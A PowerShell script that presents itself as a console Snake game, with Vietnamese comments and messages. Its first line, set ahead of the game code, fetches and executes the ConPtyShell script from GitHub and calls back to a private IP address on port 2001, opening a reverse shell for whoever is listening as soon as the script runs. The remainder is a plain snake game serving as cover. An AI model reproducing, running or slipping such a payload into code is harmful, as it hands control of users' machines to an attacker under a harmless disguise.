IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.10.231 2001 # ================== SETUP ================== $width = 40 $height = 20 $delay = 120 # ms – giảm để rắn chạy nhanh hơn [Console]::CursorVisible = $false [Console]::Clear() # ================== INIT ================== $snake = @( @{x = [int]($width / 2); y = [int]($height / 2)} ) $dir = "Right" $food = @{ x = Get-Random -Minimum 1 -Maximum ($width - 2) y = Get-Random -Minimum 1 -Maximum ($height - 2) } $gameOver = $false # ================== DRAW ================== function Draw { [Console]::SetCursorPosition(0,0) for ($y = 0; $y -le $height; $y++) { for ($x = 0; $x -le $width; $x++) { if ($x -eq 0 -or $x -eq $width -or $y -eq 0 -or $y -eq $height) { Write-Host "#" -NoNewline } elseif ($snake | Where-Object { $_.x -eq $x -and $_.y -eq $y }) { Write-Host "O" -NoNewline } elseif ($food.x -eq $x -and $food.y -eq $y) { Write-Host "@" -NoNewline } else { Write-Host " " -NoNewline } } Write-Host "" } Write-Host "WASD để di chuyển | Ctrl + C để thoát" } # ================== INPUT ================== function Read-Key { if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true).Key switch ($key) { "W" { if ($dir -ne "Down") { $dir = "Up" } } "S" { if ($dir -ne "Up") { $dir = "Down" } } "A" { if ($dir -ne "Right") { $dir = "Left" } } "D" { if ($dir -ne "Left") { $dir = "Right" } } } } } # ================== GAME LOOP ================== try { while (-not $gameOver) { Read-Key $head = $snake[0].Clone() switch ($dir) { "Up" { $head.y-- } "Down" { $head.y++ } "Left" { $head.x-- } "Right" { $head.x++ } } # Đụng tường if ($head.x -le 0 -or $head.x -ge $width -or $head.y -le 0 -or $head.y -ge $height) { $gameOver = $true break } # Đụng thân if ($snake | Where-Object { $_.x -eq $head.x -and $_.y -eq $head.y }) { $gameOver = $true break } $snake.Insert(0, $head) # Ăn mồi if ($head.x -eq $food.x -and $head.y -eq $food.y) { $food.x = Get-Random -Minimum 1 -Maximum ($width - 2) $food.y = Get-Random -Minimum 1 -Maximum ($height - 2) } else { $snake.RemoveAt($snake.Count - 1) } Draw Start-Sleep -Milliseconds $delay } } finally { [Console]::Clear() Write-Host "💀 GAME OVER" Write-Host "Chiều dài rắn: $($snake.Count)" Read-Host "Nhấn Enter để thoát" }
